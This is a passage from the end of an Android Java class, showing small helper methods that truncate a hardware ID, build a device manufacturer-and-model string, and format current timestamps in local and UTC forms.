    private static String shorten(String hwid) {
        if (hwid == null || hwid.isEmpty()) return "DEV_UNKNOWN";
        return hwid.length() > 8 ? hwid.substring(0, 8) : hwid;
    }

    private static String deviceModel() {
        return (Build.MANUFACTURER == null ? "" : Build.MANUFACTURER) + " "
                + (Build.MODEL == null ? "" : Build.MODEL);
    }

    private static String fmt(String pattern, long ms) {
        return new SimpleDateFormat(pattern, Locale.US).format(new Date(ms));
    }

    private static String nowTs() { return fmt("yyyy-MM-dd HH:mm:ss", System.currentTimeMillis()); }

    private static String fileStamp() { return fmt("yyyyMMdd_HHmmss_SSS", System.currentTimeMillis()); }

    private static String isoNow() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
        return sdf.format(new Date());
    }
}
